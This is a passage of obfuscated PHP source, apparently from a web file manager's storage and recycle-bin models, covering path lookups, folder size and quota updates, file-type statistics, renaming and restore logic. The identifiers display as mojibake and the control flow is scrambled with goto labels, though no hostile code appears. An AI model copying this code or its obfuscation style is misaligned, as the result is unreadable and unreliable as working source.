$this->where($Dö¨÷ò˜–µ)->where(array($Bô¨¬´íÃê[527] => 0))->count(); return array($Bô¨¬´íÃê[81] => $fÌ‘­Ä‹‘é, $Bô¨¬´íÃê[82] => $a„çß’ó÷»); } public function pathInfo($a›„’°®é, $C”Ó…Ì’ù² = false) { goto bÅØø§ÑŒ…; FÂù—½¸»§: if ($Bø³‡‚ÊÎ) { return $Bø³‡‚ÊÎ; } $fË¤ù‚´½Î = $this->sourceInfo($a›„’°®é); if (!$fË¤ù‚´½Î) { return !1; } goto d‘‰’ø­; bÅØø§ÑŒ…: $AÇÌÒÍÕ«ñ =& $_SERVER[¯Ò¬Èè]; $c­°†ŒŞ¾ = $AÇÌÒÍÕ«ñ[411] . intval($C”Ó…Ì’ù²) . $AÇÌÒÍÕ«ñ[412] . $a›„’°®é; $Bø³‡‚ÊÎ = _get(self::$cachePathInfo, $c­°†ŒŞ¾); goto FÂù—½¸»§; d‘‰’ø­: $fË¤ù‚´½Î = $this->_listDataApplyItem($fË¤ù‚´½Î, $C”Ó…Ì’ù²); self::$cachePathInfo[$c­°†ŒŞ¾] = $fË¤ù‚´½Î; return $fË¤ù‚´½Î; goto aÅ…Íø‚Ç©; aÅ…Íø‚Ç©: } public static $cachePathInfoMore = array(); public function pathInfoMore($Eº•–óö‹) { goto F‰¶ÈÁ­”É; B¡¸ñ¡‚êÃ: $E”Å…ôŠ§ö = $this->pathInfo($Eº•–óö‹); if (!$E”Å…ôŠ§ö) { return !1; } if ($E”Å…ôŠ§ö[$fÀš‘ŒŒ[370]] == $fÀš‘ŒŒ[83]) { $E”Å…ôŠ§ö[$fÀš‘ŒŒ[80]] = $this->folderChildrenNumber($Eº•–óö‹); } goto EŸ˜¸İê¨; F‰¶ÈÁ­”É: $fÀš‘ŒŒ =& $_SERVER[¯Ò¬Èè]; $B¬ˆ“§¶‡ = _get(self::$cachePathInfoMore, $Eº•–óö‹); if ($B¬ˆ“§¶‡) { return $B¬ˆ“§¶‡; } goto B¡¸ñ¡‚êÃ; EŸ˜¸İê¨: self::$cachePathInfoMore[$Eº•–óö‹] = $E”Å…ôŠ§ö; return $E”Å…ôŠ§ö; goto dì’ñ§ÂÇ; dì’ñ§ÂÇ: } public function sourceInfo($e ç°õÁã) { goto cİÚì–”; cİÚì–”: $Fíš›ä«‡– =& $_SERVER[¯Ò¬Èè]; if (!$e ç°õÁã) { return array(); } $eÄºóƒ„äè = $Fíš›ä«‡–[410] . $e ç°õÁã; goto D«ò™ŒŒ; Dì’Š…ğëØ: self::$cacheSourceInfo[$eÄºóƒ„äè] = $b•ç……‹§ƒ; return self::$cacheSourceInfo[$eÄºóƒ„äè]; goto Bø°­»¯ë‰; D«ò™ŒŒ: $Aì©À‹¡ºø = _get(self::$cacheSourceInfo, $eÄºóƒ„äè); if ($Aì©À‹¡ºø) { return $Aì©À‹¡ºø; } $b•ç……‹§ƒ = $this->where(array($Fíš›ä«‡–[369] => $e ç°õÁã))->find(); goto Dì’Š…ğëØ; Bø°­»¯ë‰: } public function sourceCacheClear($a³Î–³¾àŠ = false) { if ($a³Î–³¾àŠ == !1) { self::$cacheSourceInfo = null; self::$cacheSourceInfo = array(); return; } unset(self::$cacheSourceInfo[$_SERVER[¯Ò¬Èè][410] . $a³Î–³¾àŠ]); } public function pathInfoByPath($bÖğ´¢‚»›, $A‹äÍƒÀ…Å) { $CŒ‚Õ¦‡Ôİ =& $_SERVER[¯Ò¬Èè]; $Aè£À­İ = !$A‹äÍƒÀ…Å ? array() : explode($CŒ‚Õ¦‡Ôİ[8], trim($A‹äÍƒÀ…Å, $CŒ‚Õ¦‡Ôİ[8])); $dœèŒ©ØÜ = $bÖğ´¢‚»›; foreach ($Aè£À­İ as $c³ŸçŠß¼É) { $e¦Ù•ªßÎà = array($CŒ‚Õ¦‡Ôİ[461] => $dœèŒ©ØÜ, $CŒ‚Õ¦‡Ôİ[28] => $c³ŸçŠß¼É); $fÊñ†ñ—Á = $this->where($e¦Ù•ªßÎà)->select(); if (!$fÊñ†ñ—Á) { return !1; } $fÊñ†ñ—Á = array_sort_by($fÊñ†ñ—Á, $CŒ‚Õ¦‡Ôİ[397]); $dœèŒ©ØÜ = $fÊñ†ñ—Á[0][$CŒ‚Õ¦‡Ôİ[369]]; } return $this->pathInfo($dœèŒ©ØÜ, !0); } protected function updateModifyTime($c—²“§‚) { goto a‹ïÊÁñí•; e¼—ñ×Æ‘Ö: foreach ($c—²“§‚ as $c¨‰ò˜¹½† => $c÷ÚøòÄ¨Ù) { $c—²“§‚[$c¨‰ò˜¹½†] = intval($c÷ÚøòÄ¨Ù); } $Dƒ§ÈåÚˆë = array($A´ˆ‚«Œàµ[369] => array($A´ˆ‚«Œàµ[7], $c—²“§‚)); $C“¢œÚÁ¸ = array($A´ˆ‚«Œàµ[533] => USER_ID, $A´ˆ‚«Œàµ[390] => time()); goto D‰–ñ§½œ; a‹ïÊÁñí•: $A´ˆ‚«Œàµ =& $_SERVER[¯Ò¬Èè]; if (!$c—²“§‚) { return; } if (!is_array($c—²“§‚)) { $c—²“§‚ = array($c—²“§‚); } goto e¼—ñ×Æ‘Ö; D‰–ñ§½œ: $this->where($Dƒ§ÈåÚˆë)->save($C“¢œÚÁ¸); goto AñğñŞ˜İ; AñğñŞ˜İ: } public function folderSizeReset($b¬—¿ãˆ¬â) { goto e…¥àø¤‡å; e…¥àø¤‡å: $BÛŞèÖÀ»Š =& $_SERVER[¯Ò¬Èè]; if ($this->statusIgnoreResetSpace) { return; } $F¨¡•ñ„½ = $BÛŞèÖÀ»Š[2365] . $b¬—¿ãˆ¬â; goto d‡ºÖŠ‹ò; BÄÙÜ¸£Óß: $C¥ÁİÍÁ = array($BÛŞèÖÀ»Š[368] => $b¬—¿ãˆ¬â, $BÛŞèÖÀ»Š[396] => 0); $FµÜªñ–Å× = $this->where($C¥ÁİÍÁ)->sum($BÛŞèÖÀ»Š[77]); $FµÜªñ–Å× = intval($FµÜªñ–Å×); goto fÄ·¥”ƒƒç; C®­££ˆÍÙ: $B¨ƒÚÖ¦ùĞ = $this->parentLevelArray($bŒ¤‰—Úì[$BÛŞèÖÀ»Š[459]]); if ($B¨ƒÚÖ¦ùĞ) { $C¥ÁİÍÁ = array($BÛŞèÖÀ»Š[369] => array($BÛŞèÖÀ»Š[384], $B¨ƒÚÖ¦ùĞ)); if ($fÑã÷½á·Ú < 0) { $C¥ÁİÍÁ[$BÛŞèÖÀ»Š[77]] = array($BÛŞèÖÀ»Š[938], abs($fÑã÷½á·Ú)); } $this->where($C¥ÁİÍÁ)->setAdd($BÛŞèÖÀ»Š[77], $fÑã÷½á·Ú); } $this->targetSpaceUpdate($bŒ¤‰—Úì[$BÛŞèÖÀ»Š[371]], $bŒ¤‰—Úì[$BÛŞèÖÀ»Š[456]]); goto f‹Ç¦ÀÛË; f‹Ç¦ÀÛË: CacheLock::unlock($F¨¡•ñ„½); goto d›„Å£ó´; d‡ºÖŠ‹ò: CacheLock::lock($F¨¡•ñ„½, 20); $this->sourceCacheClear($b¬—¿ãˆ¬â); $bŒ¤‰—Úì = $this->sourceInfo($b¬—¿ãˆ¬â); goto BÄÙÜ¸£Óß; fÄ·¥”ƒƒç: $fÑã÷½á·Ú = $FµÜªñ–Å× - intval($bŒ¤‰—Úì[$BÛŞèÖÀ»Š[77]]); if ($fÑã÷½á·Ú == 0) { return CacheLock::unlock($F¨¡•ñ„½); } $this->where(array($BÛŞèÖÀ»Š[383] => $b¬—¿ãˆ¬â))->setField($BÛŞèÖÀ»Š[77], $FµÜªñ–Å×); goto C®­££ˆÍÙ; d›„Å£ó´: } public function folderSizeResetChildren($C‰®¨íæ—Ü) { goto FùáÊí‡Ëİ; EêÌ’Æ‡—: $aŒœ‰®Û™ = array($BÎé”éøŠÉ[527] => 1, $BÎé”éøŠÉ[534] => array($BÎé”éøŠÉ[483], $FÛ¹ÆĞ[$BÎé”éøŠÉ[459]] . $C‰®¨íæ—Ü . $BÎé”éøŠÉ[484])); $Eéô¸Ñ‰õ = $BÎé”éøŠÉ[2366]; $AÇµ¹ã·ˆ‚ = $this->field($Eéô¸Ñ‰õ)->where($aŒœ‰®Û™)->select(); goto AŠãà‚°‰; FùáÊí‡Ëİ: $BÎé”éøŠÉ =& $_SERVER[¯Ò¬Èè]; $this->sourceCacheClear($C‰®¨íæ—Ü); $FÛ¹ÆĞ = $this->sourceInfo($C‰®¨íæ—Ü); goto EêÌ’Æ‡—; FŠ‡Ä§Ü¿Ç: $AÇµ¹ã·ˆ‚[] = $FÛ¹ÆĞ; $AÇµ¹ã·ˆ‚ = array_to_keyvalue($AÇµ¹ã·ˆ‚, $BÎé”éøŠÉ[369]); foreach ($AÇµ¹ã·ˆ‚ as $FÓÆ³ğßß™ => $bíÃ‚ºë·) { $AÇµ¹ã·ˆ‚[$FÓÆ³ğßß™][$BÎé”éøŠÉ[2367]] = $AÇµ¹ã·ˆ‚[$FÓÆ³ğßß™][$BÎé”éøŠÉ[77]]; $AÇµ¹ã·ˆ‚[$FÓÆ³ğßß™][$BÎé”éøŠÉ[77]] = 0; } goto FÒÃ³ò‰‹; FÒÃ³ò‰‹: foreach ($Bâ´‰Ùµêº as $bíÃ‚ºë·) { $e ñšŒ•¤— = $bíÃ‚ºë·[$BÎé”éøŠÉ[461]] . $BÎé”éøŠÉ[33]; if (!isset($AÇµ¹ã·ˆ‚[$e ñšŒ•¤—])) { continue; } if ($bíÃ‚ºë·[$BÎé”éøŠÉ[397]] == $AÇµ¹ã·ˆ‚[$e ñšŒ•¤—][$BÎé”éøŠÉ[397]]) { $AÇµ¹ã·ˆ‚[$e ñšŒ•¤—][$BÎé”éøŠÉ[77]] += $bíÃ‚ºë·[$BÎé”éøŠÉ[77]]; } } foreach ($AÇµ¹ã·ˆ‚ as $bíÃ‚ºë·) { $c†Á÷ÊÂ¦ = $this->parentLevelArray($bíÃ‚ºë·[$BÎé”éøŠÉ[459]]); foreach ($c†Á÷ÊÂ¦ as $e ñšŒ•¤—) { $e ñšŒ•¤— = $e ñšŒ•¤— . $BÎé”éøŠÉ[33]; if (!isset($AÇµ¹ã·ˆ‚[$e ñšŒ•¤—])) { continue; } if ($bíÃ‚ºë·[$BÎé”éøŠÉ[397]] == $AÇµ¹ã·ˆ‚[$e ñšŒ•¤—][$BÎé”éøŠÉ[397]]) { $AÇµ¹ã·ˆ‚[$e ñšŒ•¤—][$BÎé”éøŠÉ[77]] += $bíÃ‚ºë·[$BÎé”éøŠÉ[77]]; } } } $dÙ–º›¢è = array(); goto a·÷ñ«ÃÍˆ; a·÷ñ«ÃÍˆ: foreach ($AÇµ¹ã·ˆ‚ as $bíÃ‚ºë·) { if ($bíÃ‚ºë·[$BÎé”éøŠÉ[77]] == $bíÃ‚ºë·[$BÎé”éøŠÉ[2367]]) { continue; } $dÙ–º›¢è[] = array($BÎé”éøŠÉ[369], $bíÃ‚ºë·[$BÎé”éøŠÉ[369]], $BÎé”éøŠÉ[77], $bíÃ‚ºë·[$BÎé”éøŠÉ[77]]); } $this->saveAll($dÙ–º›¢è); goto Fºª²ñÎâà; AŠãà‚°‰: $aŒœ‰®Û™[$BÎé”éøŠÉ[370]] = 0; $Bâ´‰Ùµêº = $this->field($Eéô¸Ñ‰õ)->where($aŒœ‰®Û™)->select(); if (!$Bâ´‰Ùµêº) { return; } goto FŠ‡Ä§Ü¿Ç; Fºª²ñÎâà: } public function userSpaceReset($Dá“°“åŸÁ = false) { $eÙğ±©¾ˆ =& $_SERVER[¯Ò¬Èè]; $f›æ“•ô†¥ = $this->where(array($eÙğ±©¾ˆ[371] => self::TYPE_USER, $eÙğ±©¾ˆ[456] => $Dá“°“åŸÁ, $eÙğ±©¾ˆ[370] => 0))->sum($eÙğ±©¾ˆ[77]); Model($eÙğ±©¾ˆ[474])->userEdit($Dá“°“åŸÁ, array($eÙğ±©¾ˆ[2100] => $f›æ“•ô†¥)); } public function targetSpaceUpdate($E¢¸ºŒª¢, $b«Ê±Ñ•ËÚ) { $CšÕÔ¢‹àµ =& $_SERVER[¯Ò¬Èè]; if (!$b«Ê±Ñ•ËÚ) { return; } if (!in_array($E¢¸ºŒª¢, array(self::TYPE_USER, self::TYPE_GROUP))) { return; } $D÷”õîÅ‘ = $this->targetSpaceSize($E¢¸ºŒª¢, $b«Ê±Ñ•ËÚ); if ($E¢¸ºŒª¢ == self::TYPE_USER) { Model($CšÕÔ¢‹àµ[474])->userEdit($b«Ê±Ñ•ËÚ, array($CšÕÔ¢‹àµ[2100] => $D÷”õîÅ‘)); } else { if ($E¢¸ºŒª¢ == self::TYPE_GROUP) { Model($CšÕÔ¢‹àµ[458])->groupEdit($b«Ê±Ñ•ËÚ, array($CšÕÔ¢‹àµ[2100] => $D÷”õîÅ‘)); } } } public function targetSpaceSize($D¾’ÕéÜìÚ, $BÑÌô¥—öĞ) { goto aÎŞ„íëÊº; aÎŞ„íëÊº: $B‡‰Ú‚ø’ =& $_SERVER[¯Ò¬Èè]; $e¸ö¨…Ş‘ = $this->sourceRoot($D¾’ÕéÜìÚ, $BÑÌô¥—öĞ, !0); if (!$e¸ö¨…Ş‘) { return 0; } goto EœÔœØî®ª; EœÔœØî®ª: $FĞœİ­¿ÃÑ = floatval($e¸ö¨…Ş‘[$B‡‰Ú‚ø’[77]]); $A¡¬ÇÇ ì = array($B‡‰Ú‚ø’[534] => array($B‡‰Ú‚ø’[483], $B‡‰Ú‚ø’[470] . $e¸ö¨…Ş‘[$B‡‰Ú‚ø’[369]] . $B‡‰Ú‚ø’[484])); $A˜«ö´ª = Model($B‡‰Ú‚ø’[395])->field($B‡‰Ú‚ø’[383])->where($A¡¬ÇÇ ì)->select(); goto bÈ…Á‘…©İ; a Ö¶Æëæ: return $FĞœİ­¿ÃÑ; goto E‰‡‹ìø…Ï; bÈ…Á‘…©İ: $A˜«ö´ª = array_to_keyvalue($A˜«ö´ª, $B‡‰Ú‚ø’[33], $B‡‰Ú‚ø’[369]); $A˜«ö´ª = array_unique(array_filter($A˜«ö´ª)); if ($A˜«ö´ª) { $A¡¬ÇÇ ì = array($B‡‰Ú‚ø’[383] => array($B‡‰Ú‚ø’[384], $A˜«ö´ª)); $FĞœİ­¿ÃÑ += floatval($this->where($A¡¬ÇÇ ì)->sum($B‡‰Ú‚ø’[77])); } goto a Ö¶Æëæ; E‰‡‹ìø…Ï: } public function allFileTypeProfile() { return $this->fileTypeProfile(!1, !1); } public function userFileTypeProfile($b–£®••ÅÊ) { return $this->fileTypeProfile($b–£®••ÅÊ, SourceModel::TYPE_USER); } public function groupFileTypeProfile($f§ßÙÉ“×) { return $this->fileTypeProfile($f§ßÙÉ“×, SourceModel::TYPE_GROUP); } private function fileTypeProfile($Bßë‹¤¤Şî, $Dˆù™ÎšÀİ) { goto e¨—£ƒÖ’; dÍøÓŠ×åğ: if ($CŞàÔµ¡Û‹) { return $CŞàÔµ¡Û‹; } $Cë‹“©‡º = array($cî­ßÎè„Õ[527] => 0); if ($Bßë‹¤¤Şî != !1) { $Cë‹“©‡º[$cî­ßÎè„Õ[456]] = $Bßë‹¤¤Şî; $Cë‹“©‡º[$cî­ßÎè„Õ[371]] = $Dˆù™ÎšÀİ; } goto f«÷† ‰‰‘; e¨—£ƒÖ’: $cî­ßÎè„Õ =& $_SERVER[¯Ò¬Èè]; $aäíïµª‹ô = $cî­ßÎè„Õ[2368] . $Bßë‹¤¤Şî . $cî­ßÎè„Õ[70] . $Dˆù™ÎšÀİ; $CŞàÔµ¡Û‹ = Cache::get($aäíïµª‹ô); goto dÍøÓŠ×åğ; cÅùœ’¥ï: foreach ($c½™¸º¶İ… as $Aº’ô³­­Ñ => $DˆÊâ‹ÂãÔ) { $Cë‹“©‡º[$cî­ßÎè„Õ[372]] = $this->fileTypeWhere($Aº’ô³­­Ñ); $bÕ¤ÌÅº›Ø[$Aº’ô³­­Ñ] = array($cî­ßÎè„Õ[2370] => $DˆÊâ‹ÂãÔ[$cî­ßÎè„Õ[28]], $cî­ßÎè„Õ[2371] => $this->where($Cë‹“©‡º)->count(), $cî­ßÎè„Õ[529] => $this->where($Cë‹“©‡º)->sum($cî­ßÎè„Õ[77])); } Cache::set($aäíïµª‹ô, $bÕ¤ÌÅº›Ø, 1200); return $bÕ¤ÌÅº›Ø; goto d™§Òª“‡ğ; f«÷† ‰‰‘: $bÕ¤ÌÅº›Ø = array(); $bÕ¤ÌÅº›Ø[$cî­ßÎè„Õ[2369]] = array($cî­ßÎè„Õ[2370] => LNG($cî­ßÎè„Õ[2369]), $cî­ßÎè„Õ[2371] => $this->where($Cë‹“©‡º)->count(), $cî­ßÎè„Õ[529] => $this->where($Cë‹“©‡º)->sum($cî­ßÎè„Õ[77])); $c½™¸º¶İ… = KodIO::fileTypeList(); goto cÅùœ’¥ï; d™§Òª“‡ğ: } public function fileNameExist($fÅãß†Æğ§, $fìíÜÆéÑ) { $D±¯™–ê”¼ =& $_SERVER[¯Ò¬Èè]; $E¯ñ·¹­…‚ = $this->childList($fÅãß†Æğ§); foreach ($E¯ñ·¹­…‚ as $Aë§™·¹ãë) { if ($Aë§™·¹ãë[$D±¯™–ê”¼[28]] == $fìíÜÆéÑ) { return $Aë§™·¹ãë[$D±¯™–ê”¼[369]]; } } return !1; } public function childList($f«Œãáà½ß) { goto F£«óØÊŠù; B£Û†ö¶ëÀ: $a†Œµ˜Üß… = array($a¦ºÁª•ß[461] => intval($f«Œãáà½ß), $a¦ºÁª•ß[397] => 0); $aâ·‰ŠÕ–õ = $this->where($a†Œµ˜Üß…)->select(); $aâ·‰ŠÕ–õ = $aâ·‰ŠÕ–õ ? $aâ·‰ŠÕ–õ : array(); goto FŠ¹ÙºÂñ†; FŠ¹ÙºÂñ†: self::$cacheChildList[$dÀè£ŞÏÔ¿] = $aâ·‰ŠÕ–õ; foreach ($aâ·‰ŠÕ–õ as $A³‰¢„¶Ò) { $dÀè£ŞÏÔ¿ = $a¦ºÁª•ß[410] . $A³‰¢„¶Ò[$a¦ºÁª•ß[369]]; self::$cacheSourceInfo[$dÀè£ŞÏÔ¿] = $A³‰¢„¶Ò; } return $aâ·‰ŠÕ–õ; goto B¢‘ÈªòñÉ; F£«óØÊŠù: $a¦ºÁª•ß =& $_SERVER[¯Ò¬Èè]; $dÀè£ŞÏÔ¿ = $a¦ºÁª•ß[2349] . $f«Œãáà½ß; if (isset(self::$cacheChildList[$dÀè£ŞÏÔ¿])) { return self::$cacheChildList[$dÀè£ŞÏÔ¿]; } goto B£Û†ö¶ëÀ; B¢‘ÈªòñÉ: } public function fileNameAuto($BÆÈßäÛ¨‚, $aªÑ¨…í¥, $Cğ—¦°œè‹ = REPEAT_RENAME, $a¦ä¹ù‚¦™ = false) { $EŒá”„Ğº =& $_SERVER[¯Ò¬Èè]; $A…ùŒ„‰ÓÖ = $this->childList($BÆÈßäÛ¨‚); $cØ¸„Ó‰…Ú = array_to_keyvalue($A…ùŒ„‰ÓÖ, $EŒá”„Ğº[33], $EŒá”„Ğº[28]); return $this->fileNameAutoGet($cØ¸„Ó‰…Ú, $aªÑ¨…í¥, $Cğ—¦°œè‹, $a¦ä¹ù‚¦™); } public function fileNameAutoGet($B‡ÔôÊ‰‹ç, $Dïñ”£òè¹, $C‘‹Êß“ó›, $cä…Š¼®Ñ) { $e„ÓáéÓ±È =& $_SERVER[¯Ò¬Èè]; if ($C‘‹Êß“ó› == REPEAT_REPLACE || !$B‡ÔôÊ‰‹ç || !in_array_not_case($Dïñ”£òè¹, $B‡ÔôÊ‰‹ç) || $cä…Š¼®Ñ && $C‘‹Êß“ó› != REPEAT_RENAME_FOLDER) { return $Dïñ”£òè¹; } if ($C‘‹Êß“ó› == REPEAT_SKIP) { return !1; } $dÏ°‹–¬¡Î = $e„ÓáéÓ±È[91] . get_path_ext($Dïñ”£òè¹); $dÏ°‹–¬¡Î = $dÏ°‹–¬¡Î == $e„ÓáéÓ±È[91] || $cä…Š¼®Ñ ? $e„ÓáéÓ±È[33] : $dÏ°‹–¬¡Î; for ($E°ÖÖñà–¿ = 1; $E°ÖÖñà–¿ <= count($B‡ÔôÊ‰‹ç) + 1; $E°ÖÖñà–¿++) { $AÜ×ÏšÉ = substr($Dïñ”£òè¹, 0, strlen($Dïñ”£òè¹) - strlen($dÏ°‹–¬¡Î)); $cÉ‚¤ä—áà = $AÜ×ÏšÉ . "\x28{$E°ÖÖñà–¿}\51{$dÏ°‹–¬¡Î}"; if (!in_array_not_case($cÉ‚¤ä—áà, $B‡ÔôÊ‰‹ç)) { return $cÉ‚¤ä—áà; } } } } class SourceRecycleModel extends ModelBase { protected $tableName = "\x69\157\x5f\x73\157\x75\162\143\145\137\162\x65\143\171\143\x6c\145"; protected $dataAuto = array(array("\143\x72\x65\141\x74\x65\x54\x69\x6d\145", "\164\x69\155\145", "\x69\x6e\163\x65\x72\164", "\146\165\x6e\x63\164\151\157\156")); public function listData($Bî˜ëÊÚéå = false) { $C–Â×ŸîÊ =& $_SERVER[¯Ò¬Èè]; $Bî˜ëÊÚéå = $Bî˜ëÊÚéå ? $Bî˜ëÊÚéå : USER_ID; $AŠ·²›˜™ = $this->where(array($C–Â×ŸîÊ[1437] => $Bî˜ëÊÚéå))->select(); return array_to_keyvalue($AŠ·²›˜™, $C–Â×ŸîÊ[33], $C–Â×ŸîÊ[369]); } public function moveToRecycle($aµ¯Ã´¼ƒÙ) { goto f‰‡áŸ¼Ó’; BöÔ¹‚ƒñº: $this->recycleMove($aµ¯Ã´¼ƒÙ, 1); if ($FÛŒáÂß¬œ[$eÜ‚œõÜ¥’[370]] == $eÜ‚œõÜ¥’[83]) { $Aë¯„œÜÊë = array($eÜ‚œõÜ¥’[534] => array($eÜ‚œõÜ¥’[483], $FÛŒáÂß¬œ[$eÜ‚œõÜ¥’[459]] . $aµ¯Ã´¼ƒÙ . $eÜ‚œõÜ¥’[484])); $bòˆé¿™…Ú->where($Aë¯„œÜÊë)->setField($eÜ‚œõÜ¥’[397], 1); } goto Dã™ã§î‚; CŞ©™á±Êù: if (!$FÛŒáÂß¬œ || $FÛŒáÂß¬œ[$eÜ‚œõÜ¥’[397]] == $eÜ‚œõÜ¥’[83]) { return; } $E²•ç¦„¯£ = array($eÜ‚œõÜ¥’[383] => $aµ¯Ã´¼ƒÙ, $eÜ‚œõÜ¥’[1437] => USER_ID, $eÜ‚œõÜ¥’[530] => $FÛŒáÂß¬œ[$eÜ‚œõÜ¥’[371]], $eÜ‚œõÜ¥’[531] => $FÛŒáÂß¬œ[$eÜ‚œõÜ¥’[456]], $eÜ‚œõÜ¥’[534] => $FÛŒáÂß¬œ[$eÜ‚œõÜ¥’[459]]); $this->add($E²•ç¦„¯£); goto BöÔ¹‚ƒñº; f‰‡áŸ¼Ó’: $eÜ‚œõÜ¥’ =& $_SERVER[¯Ò¬Èè]; $bòˆé¿™…Ú = Model($eÜ‚œõÜ¥’[1126]); $FÛŒáÂß¬œ = $bòˆé¿™…Ú->sourceInfo($aµ¯Ã´¼ƒÙ); goto CŞ©™á±Êù; Dã™ã§î‚: } public function clear() { $this->remove(!1); } public function remove($e¶¡Š‘©Ò = false) { goto fé—ë–‰œ; fé—ë–‰œ: $FßÏ¶†¿© =& $_SERVER[¯Ò¬Èè]; $eª³ø´ùÇ” = Model($FßÏ¶†¿©[1126]); $cÄÁÙåá†¤ = $this->listData(); goto dİ³¼çÔ²—; fÄƒÁµÓ‹Ô: foreach ($CÃ†—Ò´á£ as $a¶èäê’”Ş) { $eª³ø´ùÇ”->targetSpaceUpdate($a¶èäê’”Ş[$FßÏ¶†¿©[371]], $a¶èäê’”Ş[$FßÏ¶†¿©[456]]); } goto c¹µ¥ŒùÉº; dİ³¼çÔ²—: $e¶¡Š‘©Ò = $e¶¡Š‘©Ò === !1 ? !1 : $e¶¡Š‘©Ò; $CÃ†—Ò´á£ = array(); foreach ($cÄÁÙåá†¤ as $cá·ˆÖÁ¥œ) { if ($e¶¡Š‘©Ò != !1 && !in_array($cá·ˆÖÁ¥œ, $e¶¡Š‘©Ò)) { continue; } $eª³ø´ùÇ”->remove($cá·ˆÖÁ¥œ, !1); $aÖÁàƒàË• = $this->where(array($FßÏ¶†¿©[369] => $cá·ˆÖÁ¥œ))->find(); $C÷æÊÒË = $aÖÁàƒàË•[$FßÏ¶†¿©[371]] . $FßÏ¶†¿©[70] . $aÖÁàƒàË•[$FßÏ¶†¿©[456]]; $CÃ†—Ò´á£[$C÷æÊÒË] = array($FßÏ¶†¿©[530] => $aÖÁàƒàË•[$FßÏ¶†¿©[371]], $FßÏ¶†¿©[456] => $aÖÁàƒàË•[$FßÏ¶†¿©[456]]); $this->where(array($FßÏ¶†¿©[369] => $cá·ˆÖÁ¥œ))->delete(); } goto fÄƒÁµÓ‹Ô; c¹µ¥ŒùÉº: } public function restore($aù„á¶ğíˆ = false) { goto f¿˜ˆ½³—Ø; A¨äÀ´¹Áº: foreach ($a×ÚÙİôâ as $eÑ‚™‘Ã«õ) { goto D¨Ø­Œ±àÃ; Bæ¶‘–…ª©: $b¢á½½¨î›[] = $dë©­µ©–[$F¤é´‚›ª[461]]; if ($dë©­µ©–[$F¤é´‚›ª[370]] == $F¤é´‚›ª[83]) { $b¢á½½¨î›[] = $eÑ‚™‘Ã«õ; } $f£½ãĞí¿ë->lockMoveEnd($eÑ‚™‘Ã«õ); goto aÒ‡¾Ë…’“; dÜ¡àÉğÑ©: if ($dë©­µ©–[$F¤é´‚›ª[370]] == $F¤é´‚›ª[83]) { $F°®”õµ² = array($F¤é´‚›ª[534] => array($F¤é´‚›ª[483], $dë©­µ©–[$F¤é´‚›ª[459]] . $eÑ‚™‘Ã«õ . $F¤é´‚›ª[484])); $f£½ãĞí¿ë->where($F°®”õµ²)->setField($F¤é´‚›ª[397], 0); $this->restoreFolderChildren($eÑ‚™‘Ã«õ, $a×ÚÙİôâ); } $this->where(array($F¤é´‚›ª[369] => $eÑ‚™‘Ã«õ))->delete(); $f£½ãĞí¿ë->folderSizeReset($dë©­µ©–[$F¤é´‚›ª[461]]); goto Bæ¶‘–…ª©; D¨Ø­Œ±àÃ: if ($aù„á¶ğíˆ != !1 && !in_array($eÑ‚™‘Ã«õ, $aù„á¶ğíˆ)) { continue; } $dë©­µ©– = $f£½ãĞí¿ë->sourceInfo($eÑ‚™‘Ã«õ); $dˆîÕåÅ†Ñ = $f£½ãĞí¿ë->sourceInfo($dë©­µ©–[$F¤é´‚›ª[461]]); goto c¯¶ª‰Íã¿; c¯¶ª‰Íã¿: if ($dˆîÕåÅ†Ñ[$F¤é´‚›ª[397]] == $F¤é´‚›ª[83]) { continue; } $f£½ãĞí¿ë->lockMoveStart($eÑ‚™‘Ã«õ); $this->recycleMove($eÑ‚™‘Ã«õ, 0); goto dÜ¡àÉğÑ©; aÒ‡¾Ë…’“: } $f£½ãĞí¿ë->updateModifyTime($b¢á½½¨î›); goto D‘°”Œ¦‚Ö; f¿˜ˆ½³—Ø: $F¤é´‚›ª =& $_SERVER[¯Ò¬Èè]; $f£½ãĞí¿ë = Model($F¤é´‚›ª[1126]); $a×ÚÙİôâ = $this->listData(); goto Eí›æµã±Ü; Eí›æµã±Ü: $aù„á¶ğíˆ = $aù„á¶ğíˆ == !1 ? !1 : $aù„á¶ğíˆ; if (!$a×ÚÙİôâ) { return !0; } $b¢á½½¨î› = array(); goto A¨äÀ´¹Áº; D‘°”Œ¦‚Ö: } private function restoreFolderChildren($Dò­ëî†Š, $A”ˆ‹Ç™’) { goto a×‚ì‹á; e´ºßí¦Î: $E°„ãÄ÷ÙÉ[$bÎñŠ—»×»[369]][1] = array_unique($E°„ãÄ÷ÙÉ[$bÎñŠ—»×»[369]][1]); $E°„ãÄ÷ÙÉ[$bÎñŠ—»×»[923]] = $bÎñŠ—»×»[2194]; $d”†§ÂÅ˜->where($E°„ãÄ÷ÙÉ)->setField($bÎñŠ—»×»[397], 1); goto dó‹¢òÉÀ; a×‚ì‹á: $bÎñŠ—»×» =& $_SERVER[¯Ò¬Èè]; $d”†§ÂÅ˜ = Model($bÎñŠ—»×»[1126]); $E°„ãÄ÷ÙÉ = array($bÎñŠ—»×»[369] => array($bÎñŠ—»×»[7], array())); goto C†Úé™êŒÌ; C†Úé™êŒÌ: foreach ($A”ˆ‹Ç™’ as $B£…®ÀÉ¦’) { if ($B£…®ÀÉ¦’ == $Dò­ëî†Š) { continue; } if (!$d”†§ÂÅ˜->isParentOf($Dò­ëî†Š, $B£…®ÀÉ¦’)) { continue; } $dÎ‘í‡Ïæ = $d”†§ÂÅ˜->sourceInfo($B£…®ÀÉ¦’); if ($dÎ‘í‡Ïæ[$bÎñŠ—»×»[370]] == $bÎñŠ—»×»[83]) { $E°„ãÄ÷ÙÉ[] = array($bÎñŠ—»×»[534] => array($bÎñŠ—»×»[483], $dÎ‘í‡Ïæ[$bÎñŠ—»×»[459]] . $B£…®ÀÉ¦’ . $bÎñŠ—»×»[484])); } else { $E°„ãÄ÷ÙÉ[$bÎñŠ—»×»[369]][1][] = $B£…®ÀÉ¦’; } } if (!$E°„ãÄ÷ÙÉ[$bÎñŠ—»×»[369]][1]) { unset($E°„ãÄ÷ÙÉ[$bÎñŠ—»×»[369]]); } if (!$E°„ãÄ÷ÙÉ) { return; } goto e´ºßí¦Î; dó‹¢òÉÀ: } private function recycleMove($Fª¼·ùËß, $f¶Ò®µ¾Ëö = 1) { $cÈ¦Ÿ«†É =& $_SERVER[¯Ò¬Èè]; $eİÎËÎÉÔ = Model($cÈ¦Ÿ«†É[1126]); $AÅäØ†Ô˜ = Model($cÈ¦Ÿ«†É[2372]); $C„åÎ‘ÛÒ£ = array($cÈ¦Ÿ«†É[369] => $Fª¼·ùËß); if 